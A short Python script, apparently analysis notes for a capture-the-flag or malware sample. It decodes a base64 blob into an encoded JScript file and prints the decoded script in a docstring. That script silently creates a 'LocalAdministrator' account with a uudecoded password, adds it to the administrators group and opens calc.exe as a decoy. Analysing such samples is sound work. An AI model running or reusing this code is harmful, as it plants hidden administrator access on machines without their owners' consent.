import base64

base64_string = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA="

decoded_bytes = base64.b64decode(base64_string)
with open('decoded_script.jse', 'wb') as f:
    f.write(decoded_bytes)

# Decode UPX
#Microsoft Script Decoder

"""
function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);
"""

# G9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*
# https://www.dcode.fr/uu-encoding